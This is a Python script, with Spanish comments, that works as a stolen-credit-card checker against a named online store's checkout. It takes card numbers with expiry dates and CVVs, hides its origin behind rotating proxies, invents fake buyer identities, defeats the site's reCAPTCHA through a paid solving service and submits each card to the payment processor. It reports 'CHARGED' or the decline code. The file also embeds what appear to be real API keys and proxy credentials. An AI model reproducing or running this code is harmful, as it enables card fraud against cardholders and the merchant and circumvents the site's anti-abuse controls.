import httpx
import asyncio
import re
import random
import string
from faker import Faker

# === CONFIGURACIÓN GLOBAL ===
CAPSOLVER_KEY = "CAP-E628130ED40FD0A0BBC180D0C7822D2C3B13D9BAAE3152A7F7A15F473A4F852F" 
SITE_KEY = "6Le908oUAAAAAAYXOj9KeXt18sTzQ7JpQQ-6j8Fp"
PAGE_URL = "https://www.according2prophecy.org/Merchant2/merchant.mvc"

# === CONFIGURACIÓN IPROYAL ===
USER = "qaxtdvtr-US-rotate"
PASS_BASE = "cpyp473gyvje"

fake = Faker('en_US')

def get_session_id():
    """Genera un ID de sesión único para rotar IP en cada petición."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

class ProphecyChecker:
    def __init__(self, cc_data):
        # Ahora solo recibe cc_data
        partes = cc_data.split('|')
        self.cc = partes[0]
        self.mes = str(int(partes[1]))
        self.ano = f"20{partes[2][-2:]}"
        self.cvv = partes[3]
        
        # Rotación automática por sesión
        session_id = get_session_id()
        self.proxy_url = f"http://{USER}:{PASS_BASE}@p.webshare.io:80"
        
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        self.sid = None

        mounts = {
            "http://": httpx.AsyncHTTPTransport(proxy=self.proxy_url),
            "https://": httpx.AsyncHTTPTransport(proxy=self.proxy_url),
        }

        self.client = httpx.AsyncClient(
            mounts=mounts,
            verify=False, 
            follow_redirects=True, 
            http2=False, 
            timeout=httpx.Timeout(90.0, connect=40.0),
            headers={"User-Agent": self.ua}
        )

    async def solve_with_capsolver(self):
        payload = {
            "clientKey": CAPSOLVER_KEY,
            "task": {
                "type": "ReCaptchaV2TaskProxyless",
                "websiteURL": PAGE_URL,
                "websiteKey": SITE_KEY
            }
        }
        try:
            async with httpx.AsyncClient(timeout=60) as solver:
                r = await solver.post("https://api.capsolver.com/createTask", json=payload)
                task_id = r.json().get("taskId")
                if not task_id: return None
                for _ in range(30):
                    await asyncio.sleep(3)
                    res = await solver.post("https://api.capsolver.com/getTaskResult", json={"clientKey": CAPSOLVER_KEY, "taskId": task_id})
                    data = res.json()
                    if data.get("status") == "ready":
                        return data.get("solution").get("gRecaptchaResponse")
            return None
        except: return None

    async def run(self):
        try:
            f_name, f_last = fake.first_name(), fake.last_name()
            f_email = f"marvin{random.randint(1000, 9999)}@gmail.com"
            f_phone = f"917{random.randint(2000000, 9999999)}"

            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://www.according2prophecy.org",
                "Connection": "keep-alive"
            }

            print(f"[*] {self.cc[:6]} -> IP Session: {self.proxy_url.split('-')[-1]}")
            
            await self.client.get("https://www.according2prophecy.org/", headers=headers)
            r_prod = await self.client.get(f"{PAGE_URL}?Screen=PROD&Store_Code=ATPMB&Product_Code=SG-0002", headers=headers)
            
            sid_match = re.search(r'Session_ID=([a-f0-9]{32})', r_prod.text)
            if not sid_match: return "❌ Error: Session_ID no encontrado"
            self.sid = sid_match.group(1)
            
            await self.client.post(f"{PAGE_URL}?Session_ID={self.sid}&", data={
                "Action": "ADPR", "Screen": "PROD", "Store_Code": "ATPMB",
                "Product_Code": "SG-0002", "Category_Code": "SG", "Quantity": "1"
            }, headers=headers)

            await self.client.post(f"{PAGE_URL}?Session_ID={self.sid}&", data={
                "Action": "ORDR", "Screen": "OUSL", "Store_Code": "ATPMB",
                "ShipFirstName": f_name, "ShipLastName": f_last, "ShipEmail": f_email,
                "ShipPhone": f_phone, "ShipAddress1": "11 W 132nd St", "ShipCity": "New York",
                "ShipStateSelect": "NY", "ShipZip": "10025", "ShipCountry": "US"
            }, headers=headers)

            card_type = 'VISA' if self.cc.startswith('4') else 'MCRD' if self.cc.startswith('5') else 'AMEX' if self.cc.startswith('3') else 'DISC' if self.cc.startswith('6') else 'VISA'
            r_opay = await self.client.post(f"{PAGE_URL}?Session_ID={self.sid}&", data={
                "Screen": "OPAY", "Action": "SHIP,PSHP,CTAX", "Store_Code": "ATPMB",
                "ShippingMethod": "flatrate:FREE Shipping", "PaymentMethod": f"paypalpro:{card_type}"
            }, headers=headers)
            
            token_match = re.search(r'name="PaymentAuthorizationToken" value="([a-f0-9]{32})"', r_opay.text)
            if not token_match: return "❌ Error: Auth Token Falló"
            auth_token = token_match.group(1)

            captcha_key = await self.solve_with_capsolver()
            if not captcha_key: return "❌ Error: CapSolver Falló"

            headers["Referer"] = f"{PAGE_URL}?Session_ID={self.sid}&Screen=OPAY"
            final_data = {
                "Action": "AUTH", "Screen": "INVC", "Store_Code": "ATPMB",
                "PaymentAuthorizationToken": auth_token,
                "g-recaptcha-response": captcha_key,
                "PaymentMethod": f"paypalpro:{card_type}",
                "PaypalPro_CardNumber": self.cc,
                "PaypalPro_CardExp_Month": self.mes, "PaypalPro_CardExp_Year": self.ano, "PaypalPro_CardCvv": self.cvv
            }

            response = await self.client.post(f"{PAGE_URL}?Session_ID={self.sid}&", data=final_data, headers=headers)

            if "Thank you" in response.text: return "🔥 COMPRA EXITOSA (CHARGED)"
            
            error = re.search(r'Unable to authorize payment:.*?&#40;(\d+)&#41;', response.text, re.DOTALL)
            if error: return f"Declinada ({error.group(1)})"
            
            miva_err = re.search(r'class="error_messages">\s*(.*?)\s*<', response.text, re.DOTALL)
            return miva_err.group(1).strip() if miva_err else "⚠️ Declinada / Error Desconocido"

        except Exception as e:
            return f"❌ Error: {str(e)[:50]}"
        finally:
            await self.client.aclose()